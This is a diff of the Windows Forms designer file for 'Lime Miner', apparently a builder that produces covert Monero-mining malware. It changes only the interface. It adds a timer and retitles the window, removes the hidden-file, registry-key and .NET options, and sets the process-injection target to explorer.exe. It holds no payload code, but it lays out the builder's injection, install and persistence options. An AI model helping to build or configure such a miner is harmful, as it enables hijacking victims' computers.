@@ -22,9 +22,11 @@ Partial Class Form1
     'Do not modify it using the code editor.
     <System.Diagnostics.DebuggerStepThrough()> _
     Private Sub InitializeComponent()
+        Me.components = New System.ComponentModel.Container()
         Dim resources As System.ComponentModel.ComponentResourceManager = New System.ComponentModel.ComponentResourceManager(GetType(Form1))
         Me.BackgroundWorker1 = New System.ComponentModel.BackgroundWorker()
         Me.BackgroundWorker2 = New System.ComponentModel.BackgroundWorker()
+        Me.Timer1 = New System.Windows.Forms.Timer(Me.components)
         Me.HuraForm1 = New Lime_Miner.HuraForm()
         Me.HuraControlBox1 = New Lime_Miner.HuraControlBox()
         Me.HuraTabControl1 = New Lime_Miner.HuraTabControl()
@@ -38,13 +40,10 @@ Partial Class Form1
         Me.txtPoolUsername = New Lime_Miner.HuraTextBox()
         Me.INS = New System.Windows.Forms.TabPage()
         Me.chkInstall = New Lime_Miner.HuraCheckBox()
-        Me.chkFileHidden = New Lime_Miner.HuraCheckBox()
         Me.Label2 = New System.Windows.Forms.Label()
         Me.txtInstallPathMain = New Lime_Miner.HuraComboBox()
         Me.Label5 = New System.Windows.Forms.Label()
         Me.txtInjection = New Lime_Miner.HuraComboBox()
-        Me.Label4 = New System.Windows.Forms.Label()
-        Me.txtInstallRegKey = New Lime_Miner.HuraTextBox()
         Me.Label1 = New System.Windows.Forms.Label()
         Me.txtInstallFileName = New Lime_Miner.HuraTextBox()
         Me.ASM = New System.Windows.Forms.TabPage()
@@ -69,7 +68,6 @@ Partial Class Form1
         Me.BLD = New System.Windows.Forms.TabPage()
         Me.txtLog = New Lime_Miner.HuraTextBox()
         Me.btnBuild = New Lime_Miner.HuraButton()
-        Me.txtDotNET = New Lime_Miner.HuraComboBox()
         Me.HuraForm1.SuspendLayout()
         Me.HuraTabControl1.SuspendLayout()
         Me.INF.SuspendLayout()
@@ -86,6 +84,11 @@ Partial Class Form1
         'BackgroundWorker2
         '
         '
+        'Timer1
+        '
+        Me.Timer1.Enabled = True
+        Me.Timer1.Interval = 4000
+        '
         'HuraForm1
         '
         Me.HuraForm1.AccentColor = System.Drawing.Color.FromArgb(CType(CType(0, Byte), Integer), CType(CType(0, Byte), Integer), CType(CType(0, Byte), Integer))
@@ -100,7 +103,7 @@ Partial Class Form1
         Me.HuraForm1.Name = "HuraForm1"
         Me.HuraForm1.Size = New System.Drawing.Size(652, 450)
         Me.HuraForm1.TabIndex = 0
-        Me.HuraForm1.Text = "Lime Monero v0.1"
+        Me.HuraForm1.Text = "Lime Miner v0.3"
         '
         'HuraControlBox1
         '
@@ -243,13 +246,10 @@ Partial Class Form1
         '
         Me.INS.BackColor = System.Drawing.Color.FromArgb(CType(CType(0, Byte), Integer), CType(CType(0, Byte), Integer), CType(CType(0, Byte), Integer))
         Me.INS.Controls.Add(Me.chkInstall)
-        Me.INS.Controls.Add(Me.chkFileHidden)
         Me.INS.Controls.Add(Me.Label2)
         Me.INS.Controls.Add(Me.txtInstallPathMain)
         Me.INS.Controls.Add(Me.Label5)
         Me.INS.Controls.Add(Me.txtInjection)
-        Me.INS.Controls.Add(Me.Label4)
-        Me.INS.Controls.Add(Me.txtInstallRegKey)
         Me.INS.Controls.Add(Me.Label1)
         Me.INS.Controls.Add(Me.txtInstallFileName)
         Me.INS.Location = New System.Drawing.Point(4, 34)
@@ -271,20 +271,6 @@ Partial Class Form1
         Me.chkInstall.Size = New System.Drawing.Size(166, 22)
         Me.chkInstall.TabIndex = 21
         Me.chkInstall.Text = "Install OFF"
-        '
-        'chkFileHidden
-        '
-        Me.chkFileHidden.BaseColour = System.Drawing.Color.Black
-        Me.chkFileHidden.BorderColour = System.Drawing.Color.FromArgb(CType(CType(0, Byte), Integer), CType(CType(219, Byte), Integer), CType(CType(106, Byte), Integer))
-        Me.chkFileHidden.Checked = False
-        Me.chkFileHidden.CheckedColour = System.Drawing.Color.FromArgb(CType(CType(0, Byte), Integer), CType(CType(219, Byte), Integer), CType(CType(106, Byte), Integer))
-        Me.chkFileHidden.Cursor = System.Windows.Forms.Cursors.Hand
-        Me.chkFileHidden.FontColour = System.Drawing.Color.FromArgb(CType(CType(150, Byte), Integer), CType(CType(150, Byte), Integer), CType(CType(150, Byte), Integer))
-        Me.chkFileHidden.Location = New System.Drawing.Point(399, 183)
-        Me.chkFileHidden.Name = "chkFileHidden"
-        Me.chkFileHidden.Size = New System.Drawing.Size(166, 22)
-        Me.chkFileHidden.TabIndex = 20
-        Me.chkFileHidden.Text = "Hidden file"
         '
         'Label2
         '
@@ -331,39 +317,11 @@ Partial Class Form1
         Me.txtInjection.Font = New System.Drawing.Font("Segoe UI", 9.5!)
         Me.txtInjection.ForeColor = System.Drawing.Color.Black
         Me.txtInjection.FormattingEnabled = True
-        Me.txtInjection.Items.AddRange(New Object() {"Regasm.exe", "Itself"})
+        Me.txtInjection.Items.AddRange(New Object() {"explorer.exe"})
         Me.txtInjection.Location = New System.Drawing.Point(122, 71)
         Me.txtInjection.Name = "txtInjection"
         Me.txtInjection.Size = New System.Drawing.Size(246, 34)
         Me.txtInjection.TabIndex = 16
-        '
-        'Label4
-        '
-        Me.Label4.AutoSize = True
-        Me.Label4.Location = New System.Drawing.Point(13, 235)
-        Me.Label4.Name = "Label4"
-        Me.Label4.Size = New System.Drawing.Size(74, 25)
-        Me.Label4.TabIndex = 15
-        Me.Label4.Text = "RegKey"
-        '
-        'txtInstallRegKey
-        '
-        Me.txtInstallRegKey.BackColor = System.Drawing.Color.Transparent
-        Me.txtInstallRegKey.BackgroundColour = System.Drawing.Color.Black
-        Me.txtInstallRegKey.BorderColour = System.Drawing.Color.FromArgb(CType(CType(180, Byte), Integer), CType(CType(180, Byte), Integer), CType(CType(180, Byte), Integer))
-        Me.txtInstallRegKey.Enabled = False
-        Me.txtInstallRegKey.Location = New System.Drawing.Point(122, 228)
-        Me.txtInstallRegKey.MaxLength = 32767
-        Me.txtInstallRegKey.Multiline = False
-        Me.txtInstallRegKey.Name = "txtInstallRegKey"
-        Me.txtInstallRegKey.ReadOnly = False
-        Me.txtInstallRegKey.Size = New System.Drawing.Size(246, 38)
-        Me.txtInstallRegKey.Style = Lime_Miner.HuraTextBox.Styles.Normal
-        Me.txtInstallRegKey.TabIndex = 14
-        Me.txtInstallRegKey.Text = "Services"
-        Me.txtInstallRegKey.TextAlign = System.Windows.Forms.HorizontalAlignment.Left
-        Me.txtInstallRegKey.TextColour = System.Drawing.Color.FromArgb(CType(CType(150, Byte), Integer), CType(CType(150, Byte), Integer), CType(CType(150, Byte), Integer))
-        Me.txtInstallRegKey.UseSystemPasswordChar = False
         '
         'Label1
         '
@@ -730,7 +688,6 @@ Partial Class Form1
         Me.BLD.BackColor = System.Drawing.Color.FromArgb(CType(CType(0, Byte), Integer), CType(CType(0, Byte), Integer), CType(CType(0, Byte), Integer))
         Me.BLD.Controls.Add(Me.txtLog)
         Me.BLD.Controls.Add(Me.btnBuild)
-        Me.BLD.Controls.Add(Me.txtDotNET)
         Me.BLD.Location = New System.Drawing.Point(4, 34)
         Me.BLD.Name = "BLD"
         Me.BLD.Size = New System.Drawing.Size(620, 346)
@@ -770,22 +727,6 @@ Partial Class Form1
         Me.btnBuild.Size = New System.Drawing.Size(104, 38)
         Me.btnBuild.TabIndex = 13
         Me.btnBuild.Text = "Build"
-        '
-        'txtDotNET
-        '
-        Me.txtDotNET.AccentColor = System.Drawing.Color.FromArgb(CType(CType(180, Byte), Integer), CType(CType(180, Byte), Integer), CType(CType(180, Byte), Integer))
-        Me.txtDotNET.BackColor = System.Drawing.Color.FromArgb(CType(CType(0, Byte), Integer), CType(CType(0, Byte), Integer), CType(CType(0, Byte), Integer))
-        Me.txtDotNET.ColorScheme = Lime_Miner.HuraComboBox.ColorSchemes.Dark
-        Me.txtDotNET.DrawMode = System.Windows.Forms.DrawMode.OwnerDrawFixed
-        Me.txtDotNET.DropDownStyle = System.Windows.Forms.ComboBoxStyle.DropDownList
-        Me.txtDotNET.Font = New System.Drawing.Font("Segoe UI", 9.5!)
-        Me.txtDotNET.ForeColor = System.Drawing.Color.Black
-        Me.txtDotNET.FormattingEnabled = True
-        Me.txtDotNET.Items.AddRange(New Object() {".NET 2.0", ".NET 4.0"})
-        Me.txtDotNET.Location = New System.Drawing.Point(159, 29)
-        Me.txtDotNET.Name = "txtDotNET"
-        Me.txtDotNET.Size = New System.Drawing.Size(138, 34)
-        Me.txtDotNET.TabIndex = 12
         '
         'Form1
         '
@@ -839,16 +780,12 @@ Partial Class Form1
     Friend WithEvents BLD As TabPage
     Friend WithEvents txtLog As HuraTextBox
     Friend WithEvents btnBuild As HuraButton
-    Friend WithEvents txtDotNET As HuraComboBox
     Friend WithEvents Label1 As Label
-    Friend WithEvents Label4 As Label
-    Friend WithEvents txtInstallRegKey As HuraTextBox
     Friend WithEvents picIcon As PictureBox
     Friend WithEvents Label2 As Label
     Friend WithEvents txtInstallPathMain As HuraComboBox
     Friend WithEvents Label5 As Label
     Friend WithEvents txtInjection As HuraComboBox
-    Friend WithEvents chkFileHidden As HuraCheckBox
     Friend WithEvents chkAssembly As HuraCheckBox
     Friend WithEvents chkIcon As HuraCheckBox
     Friend WithEvents INF As TabPage
@@ -860,4 +797,5 @@ Partial Class Form1
     Friend WithEvents txtPoolUsername As HuraTextBox
     Friend WithEvents chkInstall As HuraCheckBox
     Friend WithEvents HuraAlertBox1 As HuraAlertBox
+    Friend WithEvents Timer1 As Timer
 End Class
